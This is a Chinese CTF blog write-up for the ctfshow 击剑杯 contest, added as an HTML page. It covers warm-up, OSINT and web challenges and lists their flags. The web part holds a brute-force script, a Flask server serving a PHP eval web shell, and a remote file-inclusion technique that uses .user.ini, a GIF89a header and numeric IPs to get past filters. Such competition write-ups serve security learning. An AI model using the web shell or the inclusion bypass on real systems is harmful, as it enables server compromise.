@@ -1,0 +1,931 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lewiserii">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="热身进群得码群里发送 击剑杯签到即可 听歌识曲赛后问了群友，可能真的是积累与特征吧大概有两种方法：1：听歌词百度2：直接知道什么歌答案是普京ctfshow&amp;#123;Vladimir_Vladimirovich_Putin&amp;#125; 看图识码网页是一张大的二维码，但是有四个定位符就很奇怪，根据hint，分离出四个小二维码用二维码神器cortexscan逐一扫描，然后拼接在一起，就是flag啦 看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【ctfshow】击剑杯-wp">
+<meta property="og:url" content="https://www.lewiserii.top/ctfshow/%E3%80%90ctfshow%E3%80%91%E5%87%BB%E5%89%91%E6%9D%AF-wp.html">
+<meta property="og:site_name" content="lewiserii&#39;s blog">
+<meta property="og:description" content="热身进群得码群里发送 击剑杯签到即可 听歌识曲赛后问了群友，可能真的是积累与特征吧大概有两种方法：1：听歌词百度2：直接知道什么歌答案是普京ctfshow&amp;#123;Vladimir_Vladimirovich_Putin&amp;#125; 看图识码网页是一张大的二维码，但是有四个定位符就很奇怪，根据hint，分离出四个小二维码用二维码神器cortexscan逐一扫描，然后拼接在一起，就是flag啦 看">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2-jjb-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%9C%8B%E5%9B%BE%E8%AF%86%E7%A0%81-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-4.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8B%B1%E8%AF%AD%E9%98%85%E8%AF%BB-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8B%B1%E8%AF%AD%E9%98%85%E8%AF%BB-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%BF%99%E6%98%AF%E5%93%AA%E9%87%8C-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%BF%99%E6%98%AF%E5%93%AA%E9%87%8C-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%8D%A1%E9%B2%81%E9%93%81%E7%9B%92.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E5%AE%B6%E6%83%B3%E7%8E%A9%E5%98%9B-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E5%AE%B6%E6%83%B3%E7%8E%A9%E5%98%9B-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/IyKS81.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E5%AE%B6%E6%83%B3%E7%8E%A9%E5%98%9B-4.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E6%9C%89%E7%82%B9%E5%A4%9A.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E6%9C%89%E7%82%B9%E5%A4%9A-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E6%9C%89%E7%82%B9%E5%A4%9A-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%B0%8F%E5%9F%8E%E7%BE%8E%E9%A3%9F1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%B0%8F%E5%9F%8E%E7%BE%8E%E9%A3%9F2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%B0%8F%E5%9F%8E%E7%BE%8E%E9%A3%9F3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%AE%89%E8%A3%85Arch-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B-jj-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%AD%E6%96%87%E8%AF%86%E5%88%AB%E5%B8%A6%E5%B8%88.jpg">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%8D%95%E5%90%91%E5%8A%A0%E5%AF%86.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%82%92%E9%B8%A1%E5%A5%BD%E7%8E%A9%E7%9A%84%E4%BA%95%E5%AD%97%E6%A3%8B-1.png">
+<meta property="article:published_time" content="2021-11-11T08:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-08T02:05:06.086Z">
+<meta property="article:author" content="lewiserii">
+<meta property="article:tag" content="击剑杯">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2-jjb-1.png">
+  
+  
+  
+  <title>【ctfshow】击剑杯-wp - lewiserii&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.lewiserii.top","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"150aacf9a16405ad4ea9ead54ecac598","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.lewiserii.top","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="lewiserii's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lewiserii&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                时间轴
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://www.lewiserii.top/team/">
+                <i class="iconfont icon-users"></i>
+                团队
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/fluid-bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【ctfshow】击剑杯-wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        lewiserii
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-11-11 16:00" pubdate>
+          2021年11月11日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【ctfshow】击剑杯-wp</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h1><h2 id="进群得码"><a href="#进群得码" class="headerlink" title="进群得码"></a>进群得码</h2><p>群里发送 <code>击剑杯签到即可</code></p>
+<h2 id="听歌识曲"><a href="#听歌识曲" class="headerlink" title="听歌识曲"></a>听歌识曲</h2><p>赛后问了群友，可能真的是积累与特征吧<br>大概有两种方法：<br>1：听歌词百度<br>2：直接知道什么歌<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2-jjb-1.png"><br>答案是普京<code>ctfshow&#123;Vladimir_Vladimirovich_Putin&#125;</code></p>
+<h2 id="看图识码"><a href="#看图识码" class="headerlink" title="看图识码"></a>看图识码</h2><p>网页是一张大的二维码，但是有四个定位符就很奇怪，根据hint，分离出四个小二维码<br>用二维码神器<code>cortexscan</code>逐一扫描，然后拼接在一起，就是flag啦<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%9C%8B%E5%9B%BE%E8%AF%86%E7%A0%81-1.png"></p>
+<h2 id="看图识妹"><a href="#看图识妹" class="headerlink" title="看图识妹"></a>看图识妹</h2><p>直接贴大佬的脚本了<br>注意要下个<code>chromedriver.exe</code><br><a target="_blank" rel="noopener" href="https://chromedriver.chromium.org/home">网址</a>,版本要与chrome一致</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_to_get_ans</span>(<span class="hljs-params">session, url</span>):<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">f&#x27;session=<span class="hljs-subst">&#123;session&#125;</span>&#x27;</span>&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product([<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>], [<span class="hljs-built_in">str</span>(n) <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]):<br>        chk = requests.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/check&#x27;</span>, &#123;<span class="hljs-string">&#x27;meizi_id&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>.join(i)&#125;, headers=headers).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;回答错误，轮数重新开始计算&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> chk:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br><br><br>driver = webdriver.Chrome(<span class="hljs-string">r&#x27;chromedriver.exe&#x27;</span>)<br>url = <span class="hljs-string">&#x27;http://002b1a4d-e639-4e31-b149-dd0fb39d779d.challenge.ctf.show/&#x27;</span><br><br>driver.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/start&#x27;</span>)<br>n = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> n &lt;= <span class="hljs-number">100</span>:<br>    cke = driver.get_cookie(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    ans=force_to_get_ans(cke, url)<br>    driver.find_element_by_name(<span class="hljs-string">&#x27;meizi_id&#x27;</span>).send_keys(ans)<br>    driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/form/p[4]/button&#x27;</span>).click()<br>    sleep(<span class="hljs-number">3</span>)<br>    n+=1s<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="见微知著"><a href="#见微知著" class="headerlink" title="见微知著"></a>见微知著</h2><p>远程文件包含<br>先在服务器上用flask搭建一个网页</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
+<p>运行<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-1.png"></p>
+<p>上传一个<code>.user.ini</code>文件用来远程包含<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-2.png"></p>
+<p>因为加了头检测，所以需要在文件前加上<code>GIF89a</code><br>在这个环境中，点也被过滤了，所以需要将ip转为数字<br><a target="_blank" rel="noopener" href="http://www.jsons.cn/ipnum/">在线转换</a><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-4.png"></p>
+<p>访问upload即可远程包含<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-3.png"></p>
+<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="英语阅读"><a href="#英语阅读" class="headerlink" title="英语阅读"></a>英语阅读</h2><p>OSINT的全称是<code>Open source intelligence</code><br>根据这个进行关键词搜索<br>第一篇就是<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8B%B1%E8%AF%AD%E9%98%85%E8%AF%BB-1.png"><br>开头就是人名<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8B%B1%E8%AF%AD%E9%98%85%E8%AF%BB-2.png"><br>flag为<code>ctfshow&#123;Bill_Donovan&#125;</code></p>
+<h2 id="这是哪里"><a href="#这是哪里" class="headerlink" title="这是哪里"></a>这是哪里</h2><p>图片很大，将主要信息人物截图再百度搜图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%BF%99%E6%98%AF%E5%93%AA%E9%87%8C-1.png"><br>在贴吧中得到信息<code>漳州市东山县黄道周公园</code><br>查询经纬度<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%BF%99%E6%98%AF%E5%93%AA%E9%87%8C-2.png"><br><code>ctfshow&#123;23.7353_117.5125&#125;</code></p>
+<h2 id="卡鲁铁盒"><a href="#卡鲁铁盒" class="headerlink" title="卡鲁铁盒"></a>卡鲁铁盒</h2><p>谷歌搜图可以找到<a target="_blank" rel="noopener" href="https://geckosint.medium.com/10-beginner-osint-ctf-solutions-ae89e557a4b">原题</a></p>
+<p>根据题目给出的<a target="_blank" rel="noopener" href="https://www.track-trace.com/">网址</a>搜索编号，找到港口和csc编号<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%8D%A1%E9%B2%81%E9%93%81%E7%9B%92.png"><br>注意名称全大写<br>flag:<code>ctfshow&#123;FBV854404_ROTTERDAM&#125;</code></p>
+<h2 id="人家想玩嘛"><a href="#人家想玩嘛" class="headerlink" title="人家想玩嘛"></a>人家想玩嘛</h2><blockquote>
+<p>ctfshow{娱乐项目名称-当地该娱乐项目票价-订票增值税}</p>
+</blockquote>
+<p>百度识图<br>得到位置为<code>迪拜购物中心喷泉</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E5%AE%B6%E6%83%B3%E7%8E%A9%E5%98%9B-1.png"></p>
+<p>通过谷歌地图可以得知附近的景点<code>lake fountain ride</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E5%AE%B6%E6%83%B3%E7%8E%A9%E5%98%9B-2.png"></p>
+<p>谷歌搜索<code>lake fountain ride 买票</code>，找到一个可能是官网的地方，标着票价<code>65</code>每人<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/IyKS81.png"></p>
+<p>点右边的在线购票<br>得到增值税为<code>5%</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E5%AE%B6%E6%83%B3%E7%8E%A9%E5%98%9B-4.png"></p>
+<p>最后的结果要将<code>fountain</code>去掉<br>flag为<code>ctfshow&#123;LAKE_RIDE-65-5%&#125;</code></p>
+<h2 id="人有点多"><a href="#人有点多" class="headerlink" title="人有点多"></a>人有点多</h2><p>百度识图或者谷歌识图都可以得出地点<code>涩谷</code>，图中是涩谷的标志性街道<br>谷歌地图可以得到店铺名字<code>BIC_CAMERA</code>和电话号码后四位<code>1111</code><br>BIC_CAMERA有官网，找到线路图，可以得知最近的是<code>副都心线</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E6%9C%89%E7%82%B9%E5%A4%9A.png"></p>
+<p>谷歌或者wiki里都可以得到<code>副都心线</code>的编号为<code>F16</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E6%9C%89%E7%82%B9%E5%A4%9A-1.png"></p>
+<p>其实上面的线路图已经可以看出出口是<code>B2</code>了，但是这题坑就在这里，还需要在B2前加上个<code>10</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E6%9C%89%E7%82%B9%E5%A4%9A-2.png"></p>
+<p>flag为<code>ctfshow&#123;BIC_CAMERA-1111-10B2-F16&#125;</code></p>
+<h2 id="小城美食"><a href="#小城美食" class="headerlink" title="小城美食"></a>小城美食</h2><blockquote>
+<p>flag格式：ctfshow{X省X市X区X村X号}</p>
+</blockquote>
+<p>百度识图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%B0%8F%E5%9F%8E%E7%BE%8E%E9%A3%9F1.png"></p>
+<p>关键词搜索<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%B0%8F%E5%9F%8E%E7%BE%8E%E9%A3%9F2.png"></p>
+<p>拼接一下，得到<code>浙江省衢州市柯城区龚家埠头村28号</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%B0%8F%E5%9F%8E%E7%BE%8E%E9%A3%9F3.png"></p>
+<h2 id="安装Arch"><a href="#安装Arch" class="headerlink" title="安装Arch"></a>安装Arch</h2><blockquote>
+<p>Example ctfshow{BV1GJ411x7h7}</p>
+</blockquote>
+<p>根据pdf中的几个关键信息，<code>白色字幕</code>，<code>虚拟机</code>，<code>安装arch</code>，在b站搜索arch安装，然后通过快速预览的方式粗滤查看，在细看<br>得到结果<br><code>BV1e3411B79M</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%AE%89%E8%A3%85Arch-1.png"></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="给我看看"><a href="#给我看看" class="headerlink" title="给我看看"></a>给我看看</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">whoami</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$your_answer</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$useless</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">&#x27;ctfshow第一深情&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;your_answer=<span class="hljs-string">&#x27;Only you know&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;useless=<span class="hljs-string">&quot;I_love_u&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$you_never_know</span>;<br>        <span class="hljs-variable 